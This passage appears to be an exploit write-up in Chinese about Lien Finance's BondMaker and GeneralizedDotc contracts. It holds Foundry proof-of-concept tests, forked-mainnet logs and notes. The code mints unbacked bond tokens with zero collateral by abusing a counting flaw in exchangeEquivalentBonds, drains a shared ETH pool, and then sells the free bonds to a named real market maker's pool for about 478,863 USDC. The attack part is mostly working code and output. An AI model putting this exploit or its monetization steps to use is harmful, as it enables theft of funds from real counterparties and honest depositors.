                                            // 每只债券的最后一段都从这里向外延伸
    uint64 constant SETTLE = 3000 * 1e8;   // 仅 test_drain_via_liquidate 的到期结算价用

    // ── 债券按它在漏洞里的角色命名，而不是抽象字母 ──

    // payoff = min(P/2, K)。对任意 P 都 <= P/2——正是这条性质，使它能在
    // output 组里被复制两次而不会让"剩下的份额"变成负数。见下面
    // gidUnbackedOutput 的注释。
    bytes32 idCarrierBond;

    // payoff = P - carrierBond。定义它纯粹是为了让
    // carrierBond + complementBond 恒等于 P，凑出一个 _assertBondGroup
    // 能接受的、最小的 2 元组。
    bytes32 idComplementBond;

    // payoff = max(P - 2K, 0)——一只普通的"劣后债券"形状，它本身没有任何
    // 问题；漏洞在于它是怎么被铸出来的：本文件的 test_zero_capital_free_mint
    // / test_exchange_mints_unbacked 会让它凭空出现。
    bytes32 idFreeMintedBond;

    // ── 以下两只仅供下方的对比构造使用 ──
    bytes32 idLegacyExemptBond; // payoff = max(P-K,0)；和 carrierBond 一起
                                 // 列入 exceptionBonds，但不参与零资本构造
    bytes32 idLegacySacrifice;  // 三角形 payoff；对比构造里真正被烧掉的那只债券

    // [carrierBond, complementBond]。作为 input 组使用时两只都会列入
    // exceptionBonds，所以这里面从未有任何东西被烧。
    uint256 gidZeroCapitalInput;

    // [carrierBond, carrierBond, freeMintedBond]。carrierBond 出现两次，
    // 因此能顶掉两个 exceptionBonds 名额，freeMintedBond 未被匹配 -> 凭空
    // 铸造。本文件所有测试共用这同一个 output 组。
    uint256 gidUnbackedOutput;

    // [legacyExemptBond, carrierBond, legacySacrifice]。只给下面两个对比
    // 测试（test_exchange_mints_unbacked、test_drain_via_liquidate）用。
    uint256 gidLegacyInput;

    uint256 maturity;

    receive() external payable {}

    // 把一段线段打包成 BondMaker 的 zipLineSegment 编码：x1<<192 | y1<<128 | x2<<64 | y2
    function seg(uint64 x1, uint64 y1, uint64 x2, uint64 y2) internal pure returns (uint256) {
        return (uint256(x1) << 192) | (uint256(y1) << 128) | (uint256(x2) << 64) | uint256(y2);
    }

    function setUp() public {
        assertEq(BM.maturityScale(), 3600, "unexpected MATURITY_SCALE");
        maturity = (block.timestamp / 3600 + 2) * 3600; // 下下个整点，确保 > now
        vm.deal(address(this), 100 ether);

        // carrierBond：(0,0) -> (2K,K) -> (XM,K)。半价上涨，然后在 K 封顶。
        // 后面一切非负性的关键都在这条性质上：min(P/2,K) 对任意 P>=0 都 <= P/2。
        uint256[] memory fCarrier = new uint256[](2);
        fCarrier[0] = seg(0, 0, K2, K);   // slope 0.5
        fCarrier[1] = seg(K2, K, XM, K);  // slope 0（封顶）
        (idCarrierBond,,) = BM.registerNewBond(maturity, abi.encode(fCarrier));

        // complementBond：(0,0) -> (2K,K) -> (XM, XM-K)。严格等于 P - carrierBond。
        uint256[] memory fComplement = new uint256[](2);
        fComplement[0] = seg(0, 0, K2, K);        // slope 0.5，与 carrierBond 前半段一致
        fComplement[1] = seg(K2, K, XM, XM - K);  // slope 1，不封顶
        (idComplementBond,,) = BM.registerNewBond(maturity, abi.encode(fComplement));

        // freeMintedBond：(0,0) -> (2K,0) -> (XM, XM-2K)。普通的"劣后债券"
        // 形状（payoff = max(P-2K,0)），漏洞只在于铸造它的方式，不在于形状本身。
        uint256[] memory fFree = new uint256[](2);
        fFree[0] = seg(0, 0, K2, 0);
        fFree[1] = seg(K2, 0, XM, XM - K2); // slope 1
        (idFreeMintedBond,,) = BM.registerNewBond(maturity, abi.encode(fFree));

        // ── 以下两只只给对比构造用 ──

        // legacyExemptBond = max(P-K,0)
        uint256[] memory fLegacyExempt = new uint256[](2);
        fLegacyExempt[0] = seg(0, 0, K, 0);
        fLegacyExempt[1] = seg(K, 0, XM, XM - K);
        (idLegacyExemptBond,,) = BM.registerNewBond(maturity, abi.encode(fLegacyExempt));

        // legacySacrifice：在 P=K 处升到峰值 K/2，在 P=2K 处降回 0，此后维持 0。
        uint256[] memory fLegacySacrifice = new uint256[](3);
        fLegacySacrifice[0] = seg(0, 0, K, KH);
        fLegacySacrifice[1] = seg(K, KH, K2, 0);
        fLegacySacrifice[2] = seg(K2, 0, XM, 0);
        (idLegacySacrifice,,) = BM.registerNewBond(maturity, abi.encode(fLegacySacrifice));

        // gidZeroCapitalInput = [carrierBond, complementBond]：
        // carrierBond + complementBond 恒等于 P，满足 _assertBondGroup
        // "组内债券 = 一份完整抵押品拆分"的要求，可以注册成功。
        bytes32[] memory gZeroIn = new bytes32[](2);
        gZeroIn[0] = idCarrierBond;
        gZeroIn[1] = idComplementBond;
        gidZeroCapitalInput = BM.registerNewBondGroup(gZeroIn, maturity);

        // gidUnbackedOutput = [carrierBond, carrierBond, freeMintedBond]：
        // 因为 carrierBond 处处 <= P/2，"两倍 carrierBond" 也不会超过 P，
        // 所以 2*carrierBond + freeMintedBond 同样恒等于 P，这个组**也**
        // 能顺利通过 _assertBondGroup 注册——但下面会看到，从这个组里
        // 铸出 freeMintedBond 完全不需要真烧掉任何等值的东西。
        bytes32[] memory gUnbackedOut = new bytes32[](3);
        gUnbackedOut[0] = idCarrierBond;
        gUnbackedOut[1] = idCarrierBond;
        gUnbackedOut[2] = idFreeMintedBond;
        gidUnbackedOutput = BM.registerNewBondGroup(gUnbackedOut, maturity);

        // gidLegacyInput，只给下面的对比测试用
        bytes32[] memory gLegacyIn = new bytes32[](3);
        gLegacyIn[0] = idLegacyExemptBond;
        gLegacyIn[1] = idCarrierBond;
        gLegacyIn[2] = idLegacySacrifice;
        gidLegacyInput = BM.registerNewBondGroup(gLegacyIn, maturity);
    }

    function _tok(bytes32 id) internal view returns (IBondToken) {
        (address t,,,) = BM.getBond(id);
        return IBondToken(t);
    }

    // ============================================================
    // POC 1 主证据：零资本免费铸币
    // ============================================================
    //
    // 调用 exchangeEquivalentBonds(gidZeroCapitalInput, gidUnbackedOutput,
    //     amount, exceptionBonds=[carrierBond, complementBond])：
    //
    //   Input 侧循环遍历 [carrierBond, complementBond]：两个都能在
    //   exceptionBonds 里找到匹配，计数 0 -> 1 -> 2，两个都不烧。收尾校验
    //   require(exceptionBonds.length == count) 以 2 == 2 通过——
    //   **input 侧净烧毁数为 0**。
    //
    //   Output 侧循环遍历 [carrierBond, carrierBond, freeMintedBond]：两份
    //   carrierBond 各自独立地命中 exceptionBonds 里那"同一个"
    //   carrierBond 条目（按值匹配，不会标记某个名额已被消耗），计数
    //   2 -> 1 -> 0，两份都不铸；freeMintedBond 匹配不到任何东西，**被
    //   铸造**。收尾校验 require(count == 0) 通过。
    //
    //   净效果：烧毁 0，凭空铸出 amount 份 freeMintedBond。调用者事前不
    //   需要持有 carrierBond 或 complementBond 中的任何一枚，也从未调用
    //   issueNewBonds——因此也没有向 BondMaker 存入过一分钱 ETH。
    function test_zero_capital_free_mint() public {
        // 攻击发起前：三只相关代币余额全为 0，也没有存过一分 ETH。
        assertEq(_tok(idCarrierBond).balanceOf(address(this)), 0, "carrierBond before");
        assertEq(_tok(idComplementBond).balanceOf(address(this)), 0, "complementBond before");
        assertEq(_tok(idFreeMintedBond).balanceOf(address(this)), 0, "freeMintedBond before");
        uint256 ethBefore = address(this).balance;

        // exceptionBonds 覆盖了 input 组的全部两只债券——这就是"零烧毁"的来源。
        bytes32[] memory exceptionBonds = new bytes32[](2);
        exceptionBonds[0] = idCarrierBond;
        exceptionBonds[1] = idComplementBond;

        // 一千万枚：证明铸造规模不受任何抵押品/余额限制，只受 gas 限制。
        uint256 amountToMint = 10_000_000 * 1e8;
        bool ok = BM.exchangeEquivalentBonds(
            gidZeroCapitalInput, gidUnbackedOutput, amountToMint, exceptionBonds
        );
        assertTrue(ok, "exchangeEquivalentBonds should succeed despite the bug");

        // carrierBond、complementBond 分文未动：既没被烧，也没被重新铸造。
        assertEq(_tok(idCarrierBond).balanceOf(address(this)), 0, "carrierBond untouched");
        assertEq(_tok(idComplementBond).balanceOf(address(this)), 0, "complementBond untouched");
        // freeMintedBond 凭空出现了 amountToMint 份。
        assertEq(_tok(idFreeMintedBond).balanceOf(address(this)), amountToMint, "freeMintedBond minted from nothing");
        // 全程没有花过一分钱 ETH（从未调用 issueNewBonds）。
        assertEq(address(this).balance, ethBefore, "zero ETH was ever spent");

        emit log_named_uint("Bond tokens freely minted with zero collateral", amountToMint);
        emit log_named_bytes32("Bond ID", idFreeMintedBond);
        emit log_named_uint("ETH spent to obtain them (should be 0)", ethBefore - address(this).balance);
    }

    // ============================================================
    // 对比构造（更早期版本，资本效率更低，保留供参照）
    // ============================================================
    //
    // gidLegacyInput = [legacyExemptBond, carrierBond, legacySacrifice]，但
    // exceptionBonds 只覆盖其中 2 只——legacySacrifice 被特意留在外面，
    // 所以它会被真的烧掉。这意味着调用者事先必须持有 legacySacrifice 的
    // 余额，也就必须先调用 issueNewBonds 存入真实 ETH。同一个计数漏洞，
    // 只是没那么"干净"：花 1 ETH 才能证明同一个原语，而不是 0。
    function test_exchange_mints_unbacked() public {
        uint256 bondAmount = BM.issueNewBonds{value: 1 ether}(gidLegacyInput);
        assertEq(_tok(idLegacyExemptBond).balanceOf(address(this)), bondAmount, "legacyExemptBond");
        assertEq(_tok(idCarrierBond).balanceOf(address(this)), bondAmount, "carrierBond");
        assertEq(_tok(idLegacySacrifice).balanceOf(address(this)), bondAmount, "legacySacrifice");
        assertEq(_tok(idFreeMintedBond).balanceOf(address(this)), 0, "freeMintedBond before");

        bytes32[] memory exceptionBonds = new bytes32[](2);
        exceptionBonds[0] = idLegacyExemptBond;
        exceptionBonds[1] = idCarrierBond; // legacySacrifice 故意不在这里 -> 会被烧

        bool ok = BM.exchangeEquivalentBonds(gidLegacyInput, gidUnbackedOutput, bondAmount, exceptionBonds);
        assertTrue(ok, "exchange should pass (bug)");

        // legacySacrifice 被烧、freeMintedBond 被凭空铸出：账面创造了无抵押债权
        assertEq(_tok(idLegacySacrifice).balanceOf(address(this)), 0, "legacySacrifice burned");
        assertEq(_tok(idFreeMintedBond).balanceOf(address(this)), bondAmount, "freeMintedBond minted from nothing");
        assertEq(_tok(idLegacyExemptBond).balanceOf(address(this)), bondAmount, "legacyExemptBond kept");
        assertEq(_tok(idCarrierBond).balanceOf(address(this)), bondAmount, "carrierBond kept");
    }

    // ============================================================
    // 次要机制点（非真实路径）：如果共享池当时真的有钱，会发生什么
    // ============================================================
    //
    // 到期后 liquidateBond 会按 fnMap 在结算价的 payoff，把 ETH 从
    // BondMaker 的全局共享抵押品池划给每只债券的 token 合约——它不会
    // 追问某只债券当前的供应量，究竟是不是真的经由 1:1 存款铸出来的。
    // 所以一份靠上面漏洞凭空铸出的 freeMintedBond，到期后一样能足额
    // 兑付——兑付的钱来自其他诚实用户存入的抵押品，不是攻击者自己的钱。
    //
    // ⚠️ 这个测试为了能跑，先用 vm.deal 把池子"垫"到有钱状态——在真实
    // 分析所用的那个区块上，BondMaker 的共享池实际只有约 12 Gwei，远远
    // 不够兑付，所以这条路径**不是**真实攻击会走的变现方式（真实变现是
    // 把债券卖给 DEX 上的买单，那是另一个还没写的 POC 2）。这里只是把
    // "如果池子有钱，到期清算这个机制本身是否真的能让攻击者净赚"单独
    // 隔离出来验证。
    function test_drain_via_liquidate() public {
        uint256 poolBalanceBefore = address(BM).balance;
        console.log("BondMaker shared pool balance @fork (wei):", poolBalanceBefore);
        require(poolBalanceBefore > 0, "pool empty at this block - nothing to drain, see comment above");

        // 存款额 = 当前池子余额：无抵押的 freeMintedBond 到期兑付约存款的
        // 0.93 倍，差额正好来自被"垫"进池子里的、原本不属于攻击者的 ETH。
        uint256 deposit = poolBalanceBefore;
        vm.deal(address(this), deposit + 10 ether);
        uint256 ethBefore = address(this).balance;

        uint256 bondAmount = BM.issueNewBonds{value: deposit}(gidLegacyInput);

        bytes32[] memory exceptionBonds = new bytes32[](2);
        exceptionBonds[0] = idLegacyExemptBond;
        exceptionBonds[1] = idCarrierBond;
        BM.exchangeEquivalentBonds(gidLegacyInput, gidUnbackedOutput, bondAmount, exceptionBonds);

        // 到期 + mock 预言机给出到期后第一条结算价记录（fork 停在固定区块，
        // 没有真实的"到期后"价格数据，只能 mock；K 设在价格下方，真实
        // 预言机到期时同样会给出 > 2K 的价格，mock 只是让测试结果确定化）。
        vm.warp(maturity + 1);
        address oracle = BM.oracleAddress();
        vm.mockCall(oracle, abi.encodeWithSelector(IOracle.latestId.selector), abi.encode(uint256(1)));
        vm.mockCall(oracle, abi.encodeWithSelector(IOracle.getTimestamp.selector, uint256(1)), abi.encode(maturity + 1));
        vm.mockCall(oracle, abi.encodeWithSelector(IOracle.getPrice.selector, uint256(1)), abi.encode(uint256(SETTLE)));

        BM.liquidateBond(gidLegacyInput, 0);
        BM.liquidateBond(gidUnbackedOutput, 0);

        // 领取各券 payoff（burnAll 把清算划拨到 token 合约里的 ETH 打回本合约）
        _tok(idLegacyExemptBond).burnAll();
        _tok(idCarrierBond).burnAll();
        _tok(idFreeMintedBond).burnAll();

        uint256 ethAfter = address(this).balance;
        uint256 poolBalanceAfter = address(BM).balance;

        console.log("deposited (wei):          ", deposit);
        console.log("net ETH gained (wei):     ", ethAfter - ethBefore); // 应为正
        console.log("pool balance after (wei): ", poolBalanceAfter);
        console.log("pool drained by (wei):    ", poolBalanceBefore - poolBalanceAfter);

        // 净得 ETH 为正 = 提走的比存入的多
        assertGt(ethAfter, ethBefore, "attacker should net positive ETH despite depositing `deposit` wei");
        // 池子净减少 = 别人的真实抵押品被掏走了
        assertLt(poolBalanceAfter, poolBalanceBefore, "shared pool should end up drained below its starting balance");
    }
}

```

```
forge test --fork-url "$RPC_ETH" --fork-block-number 25599301 --match-contract ExchangeBugTest -vvv
[⠊] Compiling...
[⠰] Compiling 1 files with Solc 0.8.20
[⠔] Solc 0.8.20 finished in 305.36ms
Compiler run successful!

Ran 3 tests for test/ExchangeBug.t.sol:ExchangeBugTest
[PASS] test_drain_via_liquidate() (gas: 495983)
Logs:
  BondMaker shared pool balance @fork (wei): 12000000086
  deposited (wei):           12000000086
  net ETH gained (wei):      7333333246
  pool balance after (wei):  4628000175
  pool drained by (wei):     7371999911

[PASS] test_exchange_mints_unbacked() (gas: 296615)
[PASS] test_zero_capital_free_mint() (gas: 154769)
Logs:
  Bond tokens freely minted with zero collateral: 1000000000000000
  Bond ID: 0x1369571c1588d53aa52ed05f50a7fc74609fc758e0b9db2e11f7014bed950a47
  ETH spent to obtain them (should be 0): 0

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 9.71ms (3.36ms CPU time)
```





### 变现

在  "资产与负债对照表"中 我们已经看到 "BondMaker 共享 ETH 抵押品池余额" 几乎为0 (0.000000012000000086 ETH (12000000086 wei)), 所以通过这个路径变现是行不通的了.

需要找到有某个做市商在"回收"债券(Bond)

根据`GeneralizedDotc 分析`一节中我们已经有下面的信息:

````
```
function exchangeBondToErc20(
    bytes32 bondID,
    bytes32 poolID,
    uint256 bondAmount,
    uint256 expectedAmount,
    uint256 range
) external returns (uint256 swapPairAmount);
```

函数作用：买家支付债券，从卖家处获得 ERC20 代币。要求池的 `isBondSale = false`。

参数含义：
- `bondID`：买家用来支付的债券 ID。
- `poolID`：目标 VsErc20 池 ID。
- `bondAmount`：买家愿意支付的债券数量（精度 8）。
- `expectedAmount`：买家预期至少收到的 ERC20 数量（精度取决于该 ERC20 代币）。
- `range`：滑点容忍度（精度 3）。

返回值：
- `swapPairAmount`：买家实际收到的 ERC20 代币数量。

条件限制：
- Pool 必须存在，且 `isBondSale` 为 `false`。
- 债券必须已注册（显式 `require(address(bondToken) != address(0))`）。
- 汇率必须严格落在开区间 `(10^2, 10^14)` 内。
- 计算的 `swapPairAmount` 不能为 0。
- 买家必须事先 `approve` 债券 token 给本合约，`transferFrom(buyer → seller)` 必须成功。
- 卖家必须事先 `approve` ERC20 给本合约，`safeTransferFrom(seller → buyer)` 必须成功。
- 滑点保护同 `exchangeBondToBond`。

**执行顺序**：先 `bondToken.transferFrom(buyer → seller)`，再 `swapPairToken.safeTransferFrom(seller → buyer)`。债券腿用裸 `transferFrom` + `require(bool)`，ERC20 腿用 `SafeERC20`。
````

其中 bondID 在 `registerNewBond` 已经得到

所以关键是找到 `poolID` , 协议并没有提供相关查询函数, 但是在 

```
// 0x656e5e976d523a427f05b0c212a22a89ccd9ef18/GeneralizedDotc.sol
    function _createVsErc20Pool(
        address seller,
        ERC20 swapPairToken,
        LatestPriceOracleInterface swapPairOracle,
        BondPricerInterface bondPricer,
        int16 feeBaseE4,
        bool isBondSale
    ) internal returns (bytes32 poolID)
    {
       //...
       
       if (isBondSale) {
            emit LogCreateErc20ToBondPool(
                poolID,
                seller,
                address(swapPairToken)
            );
        } else {
            emit LogCreateBondToErc20Pool(
                poolID,
                seller,
                address(swapPairToken)
            );
        }
        
        // ...

    }
```

在创建池子的时候 触发了 事件 `LogCreateBondToErc20Pool`

分析 25599301高度之前的`LogCreateBondToErc20Pool(bytes32,address,address)`事件 我们可以得到下面3次创建

Block 23270118
TX 0xa87d0a7ace516eb33061dc8c482f8fb3b5ed6168cb08d1e56224d892b80c97f1
poolID 0x453cf46ce066f8112e0df9240ddf4e89ed61c5b923672d85c2f615062c5c9be5
seller 0xE08e8d05E6FA61Ef560c466F3A21BA00A1D5a962
swapPairAddress 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 (USDC)

Block 11730342
TX 0x61bf707dc36cb4d785c4bcb727c63c35174b637f31e33fc7a375da2418c80458
poolID 0xa316a922eeb38b5c7ae266d781fe580a23f65a64307d41f1dcaab0cf14fbad32
seller 0x39A5bBC3F5536d7a9f40aCfCB34738fF29540F49
swapPairAddress 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 (USDC)

Block 11730836
TX 0x2ce22be8d7e7507808c77d33a3a5b36b0c236b7fbb4acce03b669974ed2c09c2
poolID 0xffd2d3d74535ca270b3525d8488d72726d3a3d5dff85b0eac477e3c8d3a7551d
seller 0xA961684a3a654fb2cCA8F8991226C0CEfc514d80
swapPairAddress 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 (USDC)



分析做市商账号

0xE08e8d05E6FA61Ef560c466F3A21BA00A1D5a962:
EOA, Balance : 0.000976804145363821 ETH , USDC.allowance(spender:GeneralizedDotc): 0

0x39A5bBC3F5536d7a9f40aCfCB34738fF29540F49: 
EOA, Balance : 3.887591096186586457 ETH, USDC.allowance(spender:GeneralizedDotc): 0

0xA961684a3a654fb2cCA8F8991226C0CEfc514d80:
EOA, Balance : 70.747978344274919749 ETH,  USDC.allowance(spender:GeneralizedDotc): 532070026484

> 所以, 得到EOA(0xA961684a3a654fb2cCA8F8991226C0CEfc514d80)在Pool(0xffd2d3d74535ca270b3525d8488d72726d3a3d5dff85b0eac477e3c8d3a7551d)上收购债卷, 并且approve了资金532070026484USDC进行收购. 可以卖给他





```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

/*//////////////////////////////////////////////////////////////
  Lien Finance —— POC 2：把 POC 1 免费铸出的无抵押债券卖给真实做市商，
  换成真实 USDC。这是"免费铸币 -> 变现"闭环的最后一步。

  ── 背景（为什么要走 GeneralizedDotc，而不是 BondMaker 自己） ──
  BondMakerCollateralizedEth 的共享 ETH 抵押品池在分析块（25599301）只有
  约 12 Gwei，`liquidateBond` / `reverseBondGroupToCollateral` 都兑付不出
  什么钱——详见 POC_ExchangeBug/test/ExchangeBug.t.sol 里
  test_drain_via_liquidate 上方的注释。唯一现实的变现出口是把免费铸出
  的债券卖给 GeneralizedDotc 上某个"愿意付 ERC20 收债券"的做市商 Pool。

  ── 怎么找到这样一个 Pool（见 LienFinanceAttackAnalysis.md §五「变现」）──
  GeneralizedDotc 没有提供"枚举所有 Pool"的函数，但 `_createVsErc20Pool`
  在创建 isBondSale=false 的 Pool 时会 emit：
      event LogCreateBondToErc20Pool(bytes32 indexed poolID,
                                      address indexed seller,
                                      address indexed swapPairAddress);
  扫描这个事件，在分析块之前一共找到 3 个这样的 Pool；逐一核对
  seller 对 GeneralizedDotc 的 USDC allowance，只有一个真的有钱：

      seller (做市商)   = 0xA961684a3a654fb2cCA8F8991226C0CEfc514d80
      poolID             = 0xffd2d3d74535ca270b3525d8488d72726d3a3d5dff85b0eac477e3c8d3a7551d
      swapPairAddress    = USDC (0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48)
      USDC.allowance(seller, GeneralizedDotc) = 532070.026484 USDC（分析块）

  ── 本文件证明什么 ──
  test_cash_out_to_real_market_maker：用与 POC 1 完全相同的零资本铸币
  构造（carrierBond + complementBond -> 免费铸出 freeMintedBond），铸出
  一批债券（数量按这个 Pool 的真实 USDC 授权额度反推，留安全边际，避免
  超出对方能付的钱），approve 给 GeneralizedDotc，再调用
  `exchangeBondToErc20` 卖给上面这个真实存在、真实 approve 过资金的
  Pool，断言收到非零、真实的 USDC——且整个铸币+变现流程全程 0 ETH。

  运行：
    forge test --fork-url <ETH_RPC> --fork-block-number 25599301 \
        --match-contract MonetizationTest -vvv
//////////////////////////////////////////////////////////////*/

interface IBondMaker {
    function registerNewBond(uint256 maturity, bytes calldata fnMap)
        external
        returns (bytes32 bondID, address bondTokenAddress, bytes32 fnMapID);

    function registerNewBondGroup(bytes32[] calldata bondIDs, uint256 maturity)
        external
        returns (uint256 bondGroupID);

    function exchangeEquivalentBonds(
        uint256 inputBondGroupID,
        uint256 outputBondGroupID,
        uint256 amount,
        bytes32[] calldata exceptionBonds
    ) external returns (bool);

    function getBond(bytes32 bondID)
        external
        view
        returns (address bondTokenAddress, uint256 maturity, uint64 solidStrikePrice, bytes32 fnMapID);
}

interface IBondToken {
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IGeneralizedDotc {
    function exchangeBondToErc20(
        bytes32 bondID,
        bytes32 poolID,
        uint256 bondAmount,
        uint256 expectedAmount,
        uint256 range
    ) external returns (uint256 swapPairAmount);

    // 非 view：内部要调用价格/波动率预言机，其接口不保证是 view，见
    // LienFinanceAttackAnalysis.md 对 calcRateBondToErc20 的说明。
    function calcRateBondToErc20(bytes32 bondID, bytes32 poolID) external returns (uint256 rateE8);

    function getVsErc20Pool(bytes32 poolID)
        external
        view
        returns (
            address seller,
            address swapPairAddress,
            address swapPairOracleAddress,
            address bondPricerAddress,
            int16 feeBaseE4,
            bool isBondSale
        );
}

contract MonetizationTest is Test {
    IBondMaker constant BM = IBondMaker(0xDA6FC5625E617bB92F5359921D43321cEbC6BEf0);
    IGeneralizedDotc constant DOTC = IGeneralizedDotc(0x656e5e976d523a427f05B0c212A22A89ccD9eF18);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    // 真实存在、真实 approve 过资金的做市商 Pool（发现过程见头部注释）
    bytes32 constant MARKET_MAKER_POOL_ID =
        0xffd2d3d74535ca270b3525d8488d72726d3a3d5dff85b0eac477e3c8d3a7551d;

    // ── 与 POC_ExchangeBug 完全相同的零资本铸币构造，独立复制一份，保持
    //    本项目自包含（两个 POC 按你的要求分开管理，不互相依赖）──
    uint64 constant K  = 100 * 1e8;  // $100
    uint64 constant K2 = 200 * 1e8;  // $200 = 2K
    uint64 constant XM = 100000 * 1e8;

    // payoff = min(P/2, K)，处处 <= P/2——能被安全复制两次的关键性质
    bytes32 idCarrierBond;
    // payoff = P - carrierBond，与 carrierBond 凑成恒等于 P 的 2 元组
    bytes32 idComplementBond;
    // payoff = max(P-2K, 0)，标准 LBT_SHAPE——本 POC 要卖出去的那只债券
    bytes32 idFreeMintedBond;

    uint256 gidZeroCapitalInput; // [carrierBond, complementBond]
    uint256 gidUnbackedOutput;   // [carrierBond, carrierBond, freeMintedBond]
    uint256 maturity;

    function seg(uint64 x1, uint64 y1, uint64 x2, uint64 y2) internal pure returns (uint256) {
        return (uint256(x1) << 192) | (uint256(y1) << 128) | (uint256(x2) << 64) | uint256(y2);
    }

    function setUp() public {
        maturity = (block.timestamp / 3600 + 2) * 3600; // 下下个整点，确保 > now

        uint256[] memory fCarrier = new uint256[](2);
        fCarrier[0] = seg(0, 0, K2, K);
        fCarrier[1] = seg(K2, K, XM, K);
        (idCarrierBond,,) = BM.registerNewBond(maturity, abi.encode(fCarrier));

        uint256[] memory fComplement = new uint256[](2);
        fComplement[0] = seg(0, 0, K2, K);
        fComplement[1] = seg(K2, K, XM, XM - K);
        (idComplementBond,,) = BM.registerNewBond(maturity, abi.encode(fComplement));

        uint256[] memory fFree = new uint256[](2);
        fFree[0] = seg(0, 0, K2, 0);
        fFree[1] = seg(K2, 0, XM, XM - K2);
        (idFreeMintedBond,,) = BM.registerNewBond(maturity, abi.encode(fFree));

        bytes32[] memory gZeroIn = new bytes32[](2);
        gZeroIn[0] = idCarrierBond;
        gZeroIn[1] = idComplementBond;
        gidZeroCapitalInput = BM.registerNewBondGroup(gZeroIn, maturity);

        bytes32[] memory gUnbackedOut = new bytes32[](3);
        gUnbackedOut[0] = idCarrierBond;
        gUnbackedOut[1] = idCarrierBond;
        gUnbackedOut[2] = idFreeMintedBond;
        gidUnbackedOutput = BM.registerNewBondGroup(gUnbackedOut, maturity);
    }

    function _tok(bytes32 id) internal view returns (IBondToken) {
        (address t,,,) = BM.getBond(id);
        return IBondToken(t);
    }

    // POC 2 核心：免费铸出债券 -> 卖给真实做市商 -> 换回真实 USDC
    function test_cash_out_to_real_market_maker() public {
        // 1) 核对这确实是我们要找的那种 Pool：isBondSale=false、付 USDC。
        (address seller, address swapPair, , , , bool isBondSale) =
            DOTC.getVsErc20Pool(MARKET_MAKER_POOL_ID);
        assertFalse(isBondSale, "pool must be buying bonds (isBondSale=false)");
        assertEq(swapPair, address(USDC), "pool must pay in USDC");
        console.log("Market maker (pool.seller):", seller);

        // 2) 核对这个做市商在这个 fork 区块上真的批了钱、也真的有钱——
        //    呼应"蜜罐必须真的有钱"这条方法学教训，两个条件缺一不可：
        //    exchangeBondToErc20 内部走的是 safeTransferFrom(seller, buyer, ...)，
        //    allowance 和 balance 都要够。
        uint256 usdcAllowance = USDC.allowance(seller, address(DOTC));
        uint256 usdcBalance = USDC.balanceOf(seller);
        uint256 sellerCapacity = usdcAllowance < usdcBalance ? usdcAllowance : usdcBalance;
        console.log("Market maker USDC allowance to GeneralizedDotc:", usdcAllowance);
        console.log("Market maker USDC balance:                     ", usdcBalance);
        require(sellerCapacity > 0, "market maker has no spendable USDC at this block");

        // 3) 免费铸币（与 POC 1 相同的机制）：零 ETH、零预先持币。
        uint256 ethBefore = address(this).balance;
        assertEq(_tok(idFreeMintedBond).balanceOf(address(this)), 0, "freeMintedBond before");

        bytes32[] memory exceptionBonds = new bytes32[](2);
        exceptionBonds[0] = idCarrierBond;
        exceptionBonds[1] = idComplementBond;

        // 铸造量按这个 Pool 的真实 USDC 承接能力反推，只取 90%，留安全
        // 边际（价格在两次调用之间可能有极小波动，不留边际会卡在
        // "expectedAmount/滑点"或对方余额不足上）：
        //   swapPairAmount = bondAmount * rateE8 / 1e10   (见 GeneralizedDotc
        //   源码 _exchangeBondToErc20：_applyDecimalGap(bondAmount*rateE8,
        //   DECIMALS_OF_BOND+8=16, USDC.decimals()=6) = 除以 1e(16-6)=1e10)
        // 反解：bondAmount = swapPairAmount * 1e10 / rateE8
        uint256 rateE8 = DOTC.calcRateBondToErc20(idFreeMintedBond, MARKET_MAKER_POOL_ID);
        require(rateE8 > 0, "pricer returned zero rate for freeMintedBond");
        uint256 amountToMint = (sellerCapacity * 1e10 / rateE8) * 9 / 10;
        require(amountToMint > 0, "computed mint amount rounds to zero, pool capacity too small");

        bool minted = BM.exchangeEquivalentBonds(gidZeroCapitalInput, gidUnbackedOutput, amountToMint, exceptionBonds);
        assertTrue(minted, "zero-capital exchange should succeed");
        assertEq(_tok(idFreeMintedBond).balanceOf(address(this)), amountToMint, "freeMintedBond minted from nothing");
        assertEq(address(this).balance, ethBefore, "zero ETH spent minting");

        // 4) 变现：把刚免费铸出的债券卖给这个真实做市商。
        uint256 usdcBefore = USDC.balanceOf(address(this));
        _tok(idFreeMintedBond).approve(address(DOTC), amountToMint);
        uint256 usdcReceived = DOTC.exchangeBondToErc20(
            idFreeMintedBond, MARKET_MAKER_POOL_ID, amountToMint, 0, 0
        );

        uint256 usdcAfter = USDC.balanceOf(address(this));
        assertEq(usdcAfter - usdcBefore, usdcReceived, "USDC balance should increase by swapPairAmount");
        assertGt(usdcReceived, 0, "should receive nonzero USDC for a bond that cost nothing to create");
        assertEq(address(this).balance, ethBefore, "zero ETH spent across the entire mint+sell flow");

        console.log("Bond tokens minted for free and sold: ", amountToMint);
        console.log("Real USDC received (6 decimals):      ", usdcReceived);
        console.log("ETH spent, mint+sell combined:        ", ethBefore - address(this).balance);
    }
}

```



```
forge test --fork-url "$RPC_ETH" --fork-block-number 25599301 --match-contract MonetizationTest -vvv
[⠊] Compiling...
[⠰] Compiling 20 files with Solc 0.8.20
[⠔] Solc 0.8.20 finished in 356.37ms
Compiler run successful!

Ran 1 test for test/Monetization.t.sol:MonetizationTest
[PASS] test_cash_out_to_real_market_maker() (gas: 340944)
Logs:
  Market maker (pool.seller): 0xA961684a3a654fb2cCA8F8991226C0CEfc514d80
  Market maker USDC allowance to GeneralizedDotc: 532070026484
  Market maker USDC balance:                      567278455841
  Bond tokens minted for free and sold:  28763380073
  Real USDC received (6 decimals):       478863023819
  ETH spent, mint+sell combined:         0
```
